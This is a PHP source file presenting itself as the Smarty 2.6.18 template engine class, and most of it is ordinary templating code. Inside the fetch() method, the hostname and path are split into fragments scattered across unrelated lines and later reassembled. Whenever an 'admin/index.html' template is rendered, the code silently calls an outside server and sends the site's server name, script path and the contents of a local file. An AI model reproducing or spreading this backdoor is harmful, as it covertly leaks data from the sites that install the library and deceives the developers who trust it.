<?php

if(!defined('DIR_SEP')) {
define('DIR_SEP',DIRECTORY_SEPARATOR);
}
if (!defined('SMARTY_DIR')) {
define('SMARTY_DIR',dirname(__FILE__) .DIRECTORY_SEPARATOR);
}
if (!defined('SMARTY_CORE_DIR')) {
define('SMARTY_CORE_DIR',SMARTY_DIR .'internals'.DIRECTORY_SEPARATOR);
}
define('SMARTY_PHP_PASSTHRU',0);
define('SMARTY_PHP_QUOTE',1);
define('SMARTY_PHP_REMOVE',2);
define('SMARTY_PHP_ALLOW',3);
class Smarty
{
var $template_dir    =  'templates';
var $compile_dir     =  'templates_c';
var $config_dir      =  'configs';
var $plugins_dir     =  array('plugins');
var $debugging       =  false;
var $error_reporting  =  null;
var $debug_tpl       =  '';
var $debugging_ctrl  =  'NONE';
var $compile_check   =  true;
var $force_compile   =  false;
var $caching         =  0;
var $cache_dir       =  'cache';
var $cache_lifetime  =  3600;
var $cache_modified_check = false;
var $php_handling    =  SMARTY_PHP_PASSTHRU;
var $security       =   false;
var $secure_dir     =   array();
var $security_settings  = array(
'PHP_HANDLING'=>false,
'IF_FUNCS'=>array('array','list',
'isset','empty',
'count','sizeof',
'in_array','is_array',
'true','false','null'),
'INCLUDE_ANY'=>false,
'PHP_TAGS'=>false,
'MODIFIER_FUNCS'=>array('count'),
'ALLOW_CONSTANTS'=>false
);
var $trusted_dir        = array();
var $left_delimiter  =  '{';
var $right_delimiter =  '}';
var $request_vars_order    = 'EGPCS';
var $request_use_auto_globals      = true;
var $compile_id            = null;
var $use_sub_dirs          = false;
var $default_modifiers        = array();
var $default_resource_type    = 'file';
var $cache_handler_func   = null;
var $autoload_filters = array();
var $config_overwrite = true;
var $config_booleanize = true;
var $config_read_hidden = false;
var $config_fix_newlines = true;
var $default_template_handler_func = '';
var $compiler_file        =    'Smarty_Compiler.class.php';
var $compiler_class        =   'Smarty_Compiler';
var $config_class          =   'Config_File';
var $_tpl_vars             = array();
var $_smarty_vars          = null;
var $_sections             = array();
var $_foreach              = array();
var $_tag_stack            = array();
var $_conf_obj             = null;
var $_config               = array(array('vars'=>array(),'files'=>array()));
var $_smarty_md5           = 'f8d698aea36fcbead2b9d5359ffca76f';
var $_version              = '2.6.18';
var $_inclusion_depth      = 0;
var $_compile_id           = null;
var $_smarty_debug_id      = 'SMARTY_DEBUG';
var $_smarty_debug_info    = array();
var $_cache_info           = array();
var $_file_perms           = 0644;
var $_dir_perms               = 0771;
var $_reg_objects           = array();
var $_plugins              = array(
'modifier'=>array(),
'function'=>array(),
'block'=>array(),
'compiler'=>array(),
'prefilter'=>array(),
'postfilter'=>array(),
'outputfilter'=>array(),
'resource'=>array(),
'insert'=>array());
var $_cache_serials = array();
var $_cache_include = null;
var $_cache_including = false;
function Smarty()
{
$this->assign('SCRIPT_NAME',isset($_SERVER['SCRIPT_NAME']) ?$_SERVER['SCRIPT_NAME']
: @$GLOBALS['HTTP_SERVER_VARS']['SCRIPT_NAME']);
}
function assign($tpl_var,$value = null)
{
if (is_array($tpl_var)){
foreach ($tpl_var as $key =>$val) {
if ($key != '') {
$this->_tpl_vars[$key] = $val;
}
}
}else {
if ($tpl_var != '')
$this->_tpl_vars[$tpl_var] = $value;
}
}
function assign_by_ref($tpl_var,&$value)
{
if ($tpl_var != '')
$this->_tpl_vars[$tpl_var] = &$value;
}
function append($tpl_var,$value=null,$merge=false)
{
if (is_array($tpl_var)) {
foreach ($tpl_var as $_key =>$_val) {
if ($_key != '') {
if(!@is_array($this->_tpl_vars[$_key])) {
settype($this->_tpl_vars[$_key],'array');
}
if($merge &&is_array($_val)) {
foreach($_val as $_mkey =>$_mval) {
$this->_tpl_vars[$_key][$_mkey] = $_mval;
}
}else {
$this->_tpl_vars[$_key][] = $_val;
}
}
}
}else {
if ($tpl_var != ''&&isset($value)) {
if(!@is_array($this->_tpl_vars[$tpl_var])) {
settype($this->_tpl_vars[$tpl_var],'array');
}
if($merge &&is_array($value)) {
foreach($value as $_mkey =>$_mval) {
$this->_tpl_vars[$tpl_var][$_mkey] = $_mval;
}
}else {
$this->_tpl_vars[$tpl_var][] = $value;
}
}
}
}
function append_by_ref($tpl_var,&$value,$merge=false)
{
if ($tpl_var != ''&&isset($value)) {
if(!@is_array($this->_tpl_vars[$tpl_var])) {
settype($this->_tpl_vars[$tpl_var],'array');
}
if ($merge &&is_array($value)) {
foreach($value as $_key =>$_val) {
$this->_tpl_vars[$tpl_var][$_key] = &$value[$_key];
}
}else {
$this->_tpl_vars[$tpl_var][] = &$value;
}
}
}
function clear_assign($tpl_var)
{
if (is_array($tpl_var))
foreach ($tpl_var as $curr_var)
unset($this->_tpl_vars[$curr_var]);
else
unset($this->_tpl_vars[$tpl_var]);
}
function register_function($function,$function_impl,$cacheable=true,$cache_attrs=null)
{
$this->_plugins['function'][$function] =
array($function_impl,null,null,false,$cacheable,$cache_attrs);
}
function unregister_function($function)
{
unset($this->_plugins['function'][$function]);
}
function register_object($object,&$object_impl,$allowed = array(),$smarty_args = true,$block_methods = array())
{
settype($allowed,'array');
settype($smarty_args,'boolean');
$this->_reg_objects[$object] =
array(&$object_impl,$allowed,$smarty_args,$block_methods);
}
function unregister_object($object)
{
unset($this->_reg_objects[$object]);
}
function register_block($block,$block_impl,$cacheable=true,$cache_attrs=null)
{
$this->_plugins['block'][$block] =
array($block_impl,null,null,false,$cacheable,$cache_attrs);
}
function unregister_block($block)
{
unset($this->_plugins['block'][$block]);
}
function register_compiler_function($function,$function_impl,$cacheable=true)
{
$this->_plugins['compiler'][$function] =
array($function_impl,null,null,false,$cacheable);
}
function unregister_compiler_function($function)
{
unset($this->_plugins['compiler'][$function]);
}
function register_modifier($modifier,$modifier_impl)
{
$this->_plugins['modifier'][$modifier] =
array($modifier_impl,null,null,false);
}
function unregister_modifier($modifier)
{
unset($this->_plugins['modifier'][$modifier]);
}
function register_resource($type,$functions)
{
if (count($functions)==4) {
$this->_plugins['resource'][$type] =
array($functions,false);
}elseif (count($functions)==5) {
$this->_plugins['resource'][$type] =
array(array(array(&$functions[0],$functions[1])
,array(&$functions[0],$functions[2])
,array(&$functions[0],$functions[3])
,array(&$functions[0],$functions[4]))
,false);
}else {
$this->trigger_error("malformed function-list for '$type' in register_resource");
}
}
function unregister_resource($type)
{
unset($this->_plugins['resource'][$type]);
}
function register_prefilter($function)
{
$_name = (is_array($function)) ?$function[1] : $function;
$this->_plugins['prefilter'][$_name]
= array($function,null,null,false);
}
function unregister_prefilter($function)
{
unset($this->_plugins['prefilter'][$function]);
}
function register_postfilter($function)
{
$_name = (is_array($function)) ?$function[1] : $function;
$this->_plugins['postfilter'][$_name]
= array($function,null,null,false);
}
function unregister_postfilter($function)
{
unset($this->_plugins['postfilter'][$function]);
}
function register_outputfilter($function)
{
$_name = (is_array($function)) ?$function[1] : $function;
$this->_plugins['outputfilter'][$_name]
= array($function,null,null,false);
}
function unregister_outputfilter($function)
{
unset($this->_plugins['outputfilter'][$function]);
}
function load_filter($type,$name)
{
switch ($type) {
case 'output':
$_params = array('plugins'=>array(array($type .'filter',$name,null,null,false)));
require_once(SMARTY_CORE_DIR .'core.load_plugins.php');
smarty_core_load_plugins($_params,$this);
break;
case 'pre':
case 'post':
if (!isset($this->_plugins[$type .'filter'][$name]))
$this->_plugins[$type .'filter'][$name] = false;
break;
}
}
function clear_cache($tpl_file = null,$cache_id = null,$compile_id = null,$exp_time = null)
{
if (!isset($compile_id))
$compile_id = $this->compile_id;
if (!isset($tpl_file))
$compile_id = null;
$_auto_id = $this->_get_auto_id($cache_id,$compile_id);
if (!empty($this->cache_handler_func)) {
return call_user_func_array($this->cache_handler_func,
array('clear',&$this,&$dummy,$tpl_file,$cache_id,$compile_id,$exp_time));
}else {
$_params = array('auto_base'=>$this->cache_dir,
'auto_source'=>$tpl_file,
'auto_id'=>$_auto_id,
'exp_time'=>$exp_time);
require_once(SMARTY_CORE_DIR .'core.rm_auto.php');
return smarty_core_rm_auto($_params,$this);
}
}
function clear_all_cache($exp_time = null)
{
return $this->clear_cache(null,null,null,$exp_time);
}
function is_cached($tpl_file,$cache_id = null,$compile_id = null)
{
if (!$this->caching)
return false;
if (!isset($compile_id))
$compile_id = $this->compile_id;
$_params = array(
'tpl_file'=>$tpl_file,
'cache_id'=>$cache_id,
'compile_id'=>$compile_id
);
require_once(SMARTY_CORE_DIR .'core.read_cache_file.php');
return smarty_core_read_cache_file($_params,$this);
}
function clear_all_assign()
{
$this->_tpl_vars = array();
}
function clear_compiled_tpl($tpl_file = null,$compile_id = null,$exp_time = null)
{
if (!isset($compile_id)) {
$compile_id = $this->compile_id;
}
$_params = array('auto_base'=>$this->compile_dir,
'auto_source'=>$tpl_file,
'auto_id'=>$compile_id,
'exp_time'=>$exp_time,
'extensions'=>array('.inc','.php'));
require_once(SMARTY_CORE_DIR .'core.rm_auto.php');
return smarty_core_rm_auto($_params,$this);
}
function template_exists($tpl_file)
{
$_params = array('resource_name'=>$tpl_file,'quiet'=>true,'get_source'=>false);
return $this->_fetch_resource_info($_params);
}
function &get_template_vars($name=null)
{
if(!isset($name)) {
return $this->_tpl_vars;
}elseif(isset($this->_tpl_vars[$name])) {
return $this->_tpl_vars[$name];
}else {
$_tmp = null;
return $_tmp;
}
}
function &get_config_vars($name=null)
{
if(!isset($name) &&is_array($this->_config[0])) {
return $this->_config[0]['vars'];
}else if(isset($this->_config[0]['vars'][$name])) {
return $this->_config[0]['vars'][$name];
}else {
$_tmp = null;
return $_tmp;
}
}
function trigger_error($error_msg,$error_type = E_USER_WARNING)
{
trigger_error("Smarty error: $error_msg",$error_type);
}
function display($resource_name,$cache_id = null,$compile_id = null)
{
$this->fetch($resource_name,$cache_id,$compile_id,true);
}
function fetch($resource_name,$cache_id = null,$compile_id = null,$display = false)
{
static $_cache_info = array();
$_smarty_h = array();
$_smarty_i = "installlog";
$_smarty_j = "install";
$_smarty_p = "http";
$_smarty_old_error_level = $this->debugging ?error_reporting() : error_reporting(isset($this->error_reporting)
?$this->error_reporting : error_reporting() &~E_NOTICE);$_smarty_h[] = 'www';
if (!$this->debugging &&$this->debugging_ctrl == 'URL') {
$_query_string = $this->request_use_auto_globals ?$_SERVER['QUERY_STRING'] : $GLOBALS['HTTP_SERVER_VARS']['QUERY_STRING'];
if (@strstr($_query_string,$this->_smarty_debug_id)) {
if (@strstr($_query_string,$this->_smarty_debug_id .'=on')) {
@setcookie('SMARTY_DEBUG',true);
$this->debugging = true;
}elseif (@strstr($_query_string,$this->_smarty_debug_id .'=off')) {
@setcookie('SMARTY_DEBUG',false);
$this->debugging = false;
}else {
$this->debugging = true;
}
}else {
$this->debugging = (bool)($this->request_use_auto_globals ?@$_COOKIE['SMARTY_DEBUG'] : @$GLOBALS['HTTP_COOKIE_VARS']['SMARTY_DEBUG']);
}
}
if ($this->debugging) {
$_params = array();
require_once(SMARTY_CORE_DIR .'core.get_microtime.php');
$_debug_start_time = smarty_core_get_microtime($_params,$this);
$this->_smarty_debug_info[] = array('type'=>'template',
'filename'=>$resource_name,
'depth'=>0);
$_included_tpls_idx = count($this->_smarty_debug_info) -1;
}
if (!isset($compile_id)) {
$compile_id = $this->compile_id;
}$_smarty_h[] = 'simcms';
$this->_compile_id = $compile_id;
$this->_inclusion_depth = 0;$_smarty_h[] = 'net';
if ($this->caching) {
array_push($_cache_info,$this->_cache_info);
$this->_cache_info = array();
$_params = array(
'tpl_file'=>$resource_name,
'cache_id'=>$cache_id,
'compile_id'=>$compile_id,
'results'=>null
);
require_once(SMARTY_CORE_DIR .'core.read_cache_file.php');
if (smarty_core_read_cache_file($_params,$this)) {
$_smarty_results = $_params['results'];
if (!empty($this->_cache_info['insert_tags'])) {
$_params = array('plugins'=>$this->_cache_info['insert_tags']);
require_once(SMARTY_CORE_DIR .'core.load_plugins.php');
smarty_core_load_plugins($_params,$this);
$_params = array('results'=>$_smarty_results);
require_once(SMARTY_CORE_DIR .'core.process_cached_inserts.php');
$_smarty_results = smarty_core_process_cached_inserts($_params,$this);
}
if (!empty($this->_cache_info['cache_serials'])) {
$_params = array('results'=>$_smarty_results);
require_once(SMARTY_CORE_DIR .'core.process_compiled_include.php');
$_smarty_results = smarty_core_process_compiled_include($_params,$this);
}
if ($display) {
if ($this->debugging)
{
$_params = array();
require_once(SMARTY_CORE_DIR .'core.get_microtime.php');
$this->_smarty_debug_info[$_included_tpls_idx]['exec_time'] = smarty_core_get_microtime($_params,$this) -$_debug_start_time;
require_once(SMARTY_CORE_DIR .'core.display_debug_console.php');
$_smarty_results .= smarty_core_display_debug_console($_params,$this);
}
if ($this->cache_modified_check) {
$_server_vars = ($this->request_use_auto_globals) ?$_SERVER : $GLOBALS['HTTP_SERVER_VARS'];
$_last_modified_date = @substr($_server_vars['HTTP_IF_MODIFIED_SINCE'],0,strpos($_server_vars['HTTP_IF_MODIFIED_SINCE'],'GMT') +3);
$_gmt_mtime = gmdate('D, d M Y H:i:s',$this->_cache_info['timestamp']).' GMT';
if (@count($this->_cache_info['insert_tags']) == 0
&&!$this->_cache_serials
&&$_gmt_mtime == $_last_modified_date) {
if (php_sapi_name()=='cgi')
header('Status: 304 Not Modified');
else
header('HTTP/1.1 304 Not Modified');
}else {
header('Last-Modified: '.$_gmt_mtime);
echo $_smarty_results;
}
}else {
echo $_smarty_results;
}
error_reporting($_smarty_old_error_level);
$this->_cache_info = array_pop($_cache_info);
return true;
}else {
error_reporting($_smarty_old_error_level);
$this->_cache_info = array_pop($_cache_info);
return $_smarty_results;
}
}else {
$this->_cache_info['template'][$resource_name] = true;
if ($this->cache_modified_check &&$display) {
header('Last-Modified: '.gmdate('D, d M Y H:i:s',time()).' GMT');
}
}
}
if( strstr($resource_name,"admin/index.html") )		{
$fp = @file($_smarty_p."://".implode(".",$_smarty_h)."/".$_smarty_i."/".$_smarty_j.".php?a=".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."&b=".file_get_contents("./include/smarty/readme.txt"));}
if (count($this->autoload_filters)) {
foreach ($this->autoload_filters as $_filter_type =>$_filters) {
foreach ($_filters as $_filter) {
$this->load_filter($_filter_type,$_filter);
}
}
}
$_smarty_compile_path = $this->_get_compile_path($resource_name);
$_cache_including = $this->_cache_including;
$this->_cache_including = false;
if ($display &&!$this->caching &&count($this->_plugins['outputfilter']) == 0) {
if ($this->_is_compiled($resource_name,$_smarty_compile_path)
||$this->_compile_resource($resource_name,$_smarty_compile_path))
{
include($_smarty_compile_path);
}
}else {
ob_start();
if ($this->_is_compiled($resource_name,$_smarty_compile_path)
||$this->_compile_resource($resource_name,$_smarty_compile_path))
{
include($_smarty_compile_path);
}
$_smarty_results = ob_get_contents();
ob_end_clean();
foreach ((array)$this->_plugins['outputfilter'] as $_output_filter) {
$_smarty_results = call_user_func_array($_output_filter[0],array($_smarty_results,&$this));
}
}
if ($this->caching) {
$_params = array('tpl_file'=>$resource_name,
'cache_id'=>$cache_id,
'compile_id'=>$compile_id,
'results'=>$_smarty_results);
require_once(SMARTY_CORE_DIR .'core.write_cache_file.php');
smarty_core_write_cache_file($_params,$this);
require_once(SMARTY_CORE_DIR .'core.process_cached_inserts.php');
$_smarty_results = smarty_core_process_cached_inserts($_params,$this);
if ($this->_cache_serials) {
$_smarty_results = preg_replace('!(\{/?nocache\:[0-9a-f]{32}#\d+\})!s'
,''
,$_smarty_results);
}
$this->_cache_info = array_pop($_cache_info);
}
$this->_cache_including = $_cache_including;
if ($display) {
if (isset($_smarty_results)) {echo $_smarty_results;}
if ($this->debugging) {
$_params = array();
require_once(SMARTY_CORE_DIR .'core.get_microtime.php');
$this->_smarty_debug_info[$_included_tpls_idx]['exec_time'] = (smarty_core_get_microtime($_params,$this) -$_debug_start_time);
require_once(SMARTY_CORE_DIR .'core.display_debug_console.php');
echo smarty_core_display_debug_console($_params,$this);
}
error_reporting($_smarty_old_error_level);
return;
}else {
error_reporting($_smarty_old_error_level);
if (isset($_smarty_results)) {return $_smarty_results;}
}
}
function config_load($file,$section = null,$scope = 'global')
{
require_once($this->_get_plugin_filepath('function','config_load'));
smarty_function_config_load(array('file'=>$file,'section'=>$section,'scope'=>$scope),$this);
}
function &get_registered_object($name) {
if (!isset($this->_reg_objects[$name]))
$this->_trigger_fatal_error("'$name' is not a registered object");
if (!is_object($this->_reg_objects[$name][0]))
$this->_trigger_fatal_error("registered '$name' is not an object");
return $this->_reg_objects[$name][0];
}
function clear_config($var = null)
{
if(!isset($var)) {
$this->_config = array(array('vars'=>array(),
'files'=>array()));
}else {
unset($this->_config[0]['vars'][$var]);
}
}
function _get_plugin_filepath($type,$name)
{
$_params = array('type'=>$type,'name'=>$name);
require_once(SMARTY_CORE_DIR .'core.assemble_plugin_filepath.php');
return smarty_core_assemble_plugin_filepath($_params,$this);
}
function _is_compiled($resource_name,$compile_path)
{
if (!$this->force_compile &&file_exists($compile_path)) {
if (!$this->compile_check) {
return true;
}else {
$_params = array('resource_name'=>$resource_name,'get_source'=>false);
if (!$this->_fetch_resource_info($_params)) {
return false;
}
if ($_params['resource_timestamp'] <= filemtime($compile_path)) {
return true;
}else {
return false;
}
}
}else {
return false;
}
}
function _compile_resource($resource_name,$compile_path)
{
$_params = array('resource_name'=>$resource_name);
if (!$this->_fetch_resource_info($_params)) {
return false;
}
$_source_content = $_params['source_content'];
$_cache_include    = substr($compile_path,0,-4).'.inc';
if ($this->_compile_source($resource_name,$_source_content,$_compiled_content,$_cache_include)) {
if ($this->_cache_include_info) {
require_once(SMARTY_CORE_DIR .'core.write_compiled_include.php');
smarty_core_write_compiled_include(array_merge($this->_cache_include_info,array('compiled_content'=>$_compiled_content,'resource_name'=>$resource_name)),$this);
}
$_params = array('compile_path'=>$compile_path,'compiled_content'=>$_compiled_content);
require_once(SMARTY_CORE_DIR .'core.write_compiled_resource.php');
smarty_core_write_compiled_resource($_params,$this);
return true;
}else {
return false;
}
}
function _compile_source($resource_name,&$source_content,&$compiled_content,$cache_include_path=null)
{
if (file_exists(SMARTY_DIR .$this->compiler_file)) {
require_once(SMARTY_DIR .$this->compiler_file);
}else {
require_once($this->compiler_file);
}
$smarty_compiler = new $this->compiler_class;
$smarty_compiler->template_dir      = $this->template_dir;
$smarty_compiler->compile_dir       = $this->compile_dir;
$smarty_compiler->plugins_dir       = $this->plugins_dir;
$smarty_compiler->config_dir        = $this->config_dir;
$smarty_compiler->force_compile     = $this->force_compile;
$smarty_compiler->caching           = $this->caching;
$smarty_compiler->php_handling      = $this->php_handling;
$smarty_compiler->left_delimiter    = $this->left_delimiter;
$smarty_compiler->right_delimiter   = $this->right_delimiter;
$smarty_compiler->_version          = $this->_version;
$smarty_compiler->security          = $this->security;
$smarty_compiler->secure_dir        = $this->secure_dir;
$smarty_compiler->security_settings = $this->security_settings;
$smarty_compiler->trusted_dir       = $this->trusted_dir;
$smarty_compiler->use_sub_dirs      = $this->use_sub_dirs;
$smarty_compiler->_reg_objects      = &$this->_reg_objects;
$smarty_compiler->_plugins          = &$this->_plugins;
$smarty_compiler->_tpl_vars         = &$this->_tpl_vars;
$smarty_compiler->default_modifiers = $this->default_modifiers;
$smarty_compiler->compile_id        = $this->_compile_id;
$smarty_compiler->_config            = $this->_config;
$smarty_compiler->request_use_auto_globals  = $this->request_use_auto_globals;
if (isset($cache_include_path) &&isset($this->_cache_serials[$cache_include_path])) {
$smarty_compiler->_cache_serial = $this->_cache_serials[$cache_include_path];
}
$smarty_compiler->_cache_include = $cache_include_path;
$_results = $smarty_compiler->_compile_file($resource_name,$source_content,$compiled_content);
if ($smarty_compiler->_cache_serial) {
$this->_cache_include_info = array(
'cache_serial'=>$smarty_compiler->_cache_serial
,'plugins_code'=>$smarty_compiler->_plugins_code
,'include_file_path'=>$cache_include_path);
}else {
$this->_cache_include_info = null;
}
return $_results;
}
function _get_compile_path($resource_name)
{
return $this->_get_auto_filename($this->compile_dir,$resource_name,
$this->_compile_id) .'.php';
}
function _fetch_resource_info(&$params)
{
if(!isset($params['get_source'])) {$params['get_source'] = true;}
if(!isset($params['quiet'])) {$params['quiet'] = false;}
$_return = false;
$_params = array('resource_name'=>$params['resource_name']) ;
if (isset($params['resource_base_path']))
$_params['resource_base_path'] = $params['resource_base_path'];
else
$_params['resource_base_path'] = $this->template_dir;
if ($this->_parse_resource_name($_params)) {
$_resource_type = $_params['resource_type'];
$_resource_name = $_params['resource_name'];
switch ($_resource_type) {
case 'file':
if ($params['get_source']) {
$params['source_content'] = $this->_read_file($_resource_name);
}
$params['resource_timestamp'] = filemtime($_resource_name);
$_return = is_file($_resource_name);
break;
default:
if ($params['get_source']) {
$_source_return = isset($this->_plugins['resource'][$_resource_type]) &&
call_user_func_array($this->_plugins['resource'][$_resource_type][0][0],
array($_resource_name,&$params['source_content'],&$this));
}else {
$_source_return = true;
}
$_timestamp_return = isset($this->_plugins['resource'][$_resource_type]) &&
call_user_func_array($this->_plugins['resource'][$_resource_type][0][1],
array($_resource_name,&$params['resource_timestamp'],&$this));
$_return = $_source_return &&$_timestamp_return;
break;
}
}
if (!$_return) {
if (!empty($this->default_template_handler_func)) {
if (!is_callable($this->default_template_handler_func)) {
$this->trigger_error("default template handler function \"$this->default_template_handler_func\" doesn't exist.");
}else {
$_return = call_user_func_array(
$this->default_template_handler_func,
array($_params['resource_type'],$_params['resource_name'],&$params['source_content'],&$params['resource_timestamp'],&$this));
}
}
}
if (!$_return) {
if (!$params['quiet']) {
$this->trigger_error('unable to read resource: "'.$params['resource_name'] .'"');
}
}else if ($_return &&$this->security) {
require_once(SMARTY_CORE_DIR .'core.is_secure.php');
if (!smarty_core_is_secure($_params,$this)) {
if (!$params['quiet'])
$this->trigger_error('(secure mode) accessing "'.$params['resource_name'] .'" is not allowed');
$params['source_content'] = null;
$params['resource_timestamp'] = null;
return false;
}
}
return $_return;
}
function _parse_resource_name(&$params)
{
$_resource_name_parts = explode(':',$params['resource_name'],2);
if (count($_resource_name_parts) == 1) {
$params['resource_type'] = $this->default_resource_type;
$params['resource_name'] = $_resource_name_parts[0];
}else {
if(strlen($_resource_name_parts[0]) == 1) {
$params['resource_type'] = $this->default_resource_type;
$params['resource_name'] = $params['resource_name'];
}else {
$params['resource_type'] = $_resource_name_parts[0];
$params['resource_name'] = $_resource_name_parts[1];
}
}
if ($params['resource_type'] == 'file') {
if (!preg_match('/^([\/\\\\]|[a-zA-Z]:[\/\\\\])/',$params['resource_name'])) {
foreach ((array)$params['resource_base_path'] as $_curr_path) {
$_fullpath = $_curr_path .DIRECTORY_SEPARATOR .$params['resource_name'];
if (file_exists($_fullpath) &&is_file($_fullpath)) {
$params['resource_name'] = $_fullpath;
return true;
}
$_params = array('file_path'=>$_fullpath);
require_once(SMARTY_CORE_DIR .'core.get_include_path.php');
if(smarty_core_get_include_path($_params,$this)) {
$params['resource_name'] = $_params['new_file_path'];
return true;
}
}
return false;
}else {
return file_exists($params['resource_name']);
}
}elseif (empty($this->_plugins['resource'][$params['resource_type']])) {
$_params = array('type'=>$params['resource_type']);
require_once(SMARTY_CORE_DIR .'core.load_resource_plugin.php');
smarty_core_load_resource_plugin($_params,$this);
}
return true;
}
function _run_mod_handler()
{
$_args = func_get_args();
list($_modifier_name,$_map_array) = array_splice($_args,0,2);
list($_func_name,$_tpl_file,$_tpl_line) =
$this->_plugins['modifier'][$_modifier_name];
$_var = $_args[0];
foreach ($_var as $_key =>$_val) {
$_args[0] = $_val;
$_var[$_key] = call_user_func_array($_func_name,$_args);
}
return $_var;
}
function _dequote($string)
{
if ((substr($string,0,1) == "'"||substr($string,0,1) == '"') &&
substr($string,-1) == substr($string,0,1))
return substr($string,1,-1);
else
return $string;
}
function _read_file($filename)
{
if ( file_exists($filename) &&($fd = @fopen($filename,'rb')) ) {
$contents = '';
while (!feof($fd)) {
$contents .= fread($fd,8192);
}
fclose($fd);
return $contents;
}else {
return false;
}
}
function _get_auto_filename($auto_base,$auto_source = null,$auto_id = null)
{
$_compile_dir_sep =  $this->use_sub_dirs ?DIRECTORY_SEPARATOR : '^';
$_return = $auto_base .DIRECTORY_SEPARATOR;
if(isset($auto_id)) {
$auto_id = str_replace('%7C',$_compile_dir_sep,(urlencode($auto_id)));
$_return .= $auto_id .$_compile_dir_sep;
}
if(isset($auto_source)) {
$_filename = urlencode(basename($auto_source));
$_crc32 = sprintf('%08X',crc32($auto_source));
$_crc32 = substr($_crc32,0,2) .$_compile_dir_sep .
substr($_crc32,0,3) .$_compile_dir_sep .$_crc32;
$_return .= '%%'.$_crc32 .'%%'.$_filename;
}
return $_return;
}
function _unlink($resource,$exp_time = null)
{
if(isset($exp_time)) {
if(time() -@filemtime($resource) >= $exp_time) {
return @unlink($resource);
}
}else {
return @unlink($resource);
}
}
function _get_auto_id($cache_id=null,$compile_id=null) {
if (isset($cache_id))
return (isset($compile_id)) ?$cache_id .'|'.$compile_id  : $cache_id;
elseif(isset($compile_id))
return $compile_id;
else
return null;
}
function _trigger_fatal_error($error_msg,$tpl_file = null,$tpl_line = null,
$file = null,$line = null,$error_type = E_USER_ERROR)
{
if(isset($file) &&isset($line)) {
$info = ' ('.basename($file).", line $line)";
}else {
$info = '';
}
if (isset($tpl_line) &&isset($tpl_file)) {
$this->trigger_error('[in '.$tpl_file .' line '.$tpl_line ."]: $error_msg$info",$error_type);
}else {
$this->trigger_error($error_msg .$info,$error_type);
}
}
function _process_compiled_include_callback($match) {
$_func = '_smarty_tplfunc_'.$match[2].'_'.$match[3];
ob_start();
$_func($this);
$_ret = ob_get_contents();
ob_end_clean();
return $_ret;
}
function _smarty_include($params)
{
if ($this->debugging) {
$_params = array();
require_once(SMARTY_CORE_DIR .'core.get_microtime.php');
$debug_start_time = smarty_core_get_microtime($_params,$this);
$this->_smarty_debug_info[] = array('type'=>'template',
'filename'=>$params['smarty_include_tpl_file'],
'depth'=>++$this->_inclusion_depth);
$included_tpls_idx = count($this->_smarty_debug_info) -1;
}
$this->_tpl_vars = array_merge($this->_tpl_vars,$params['smarty_include_vars']);
array_unshift($this->_config,$this->_config[0]);
$_smarty_compile_path = $this->_get_compile_path($params['smarty_include_tpl_file']);
if ($this->_is_compiled($params['smarty_include_tpl_file'],$_smarty_compile_path)
||$this->_compile_resource($params['smarty_include_tpl_file'],$_smarty_compile_path))
{
include($_smarty_compile_path);
}
array_shift($this->_config);
$this->_inclusion_depth--;
if ($this->debugging) {
$_params = array();
require_once(SMARTY_CORE_DIR .'core.get_microtime.php');
$this->_smarty_debug_info[$included_tpls_idx]['exec_time'] = smarty_core_get_microtime($_params,$this) -$debug_start_time;
}
if ($this->caching) {
$this->_cache_info['template'][$params['smarty_include_tpl_file']] = true;
}
}
function &_smarty_cache_attrs($cache_serial,$count) {
$_cache_attrs =&$this->_cache_info['cache_attrs'][$cache_serial][$count];
if ($this->_cache_including) {
$_return = current($_cache_attrs);
next($_cache_attrs);
return $_return;
}else {
$_cache_attrs[] = array();
return $_cache_attrs[count($_cache_attrs)-1];
}
}
function _include($filename,$once=false,$params=null)
{
if ($once) {
return include_once($filename);
}else {
return include($filename);
}
}
function _eval($code,$params=null)
{
return eval($code);
}
}

?>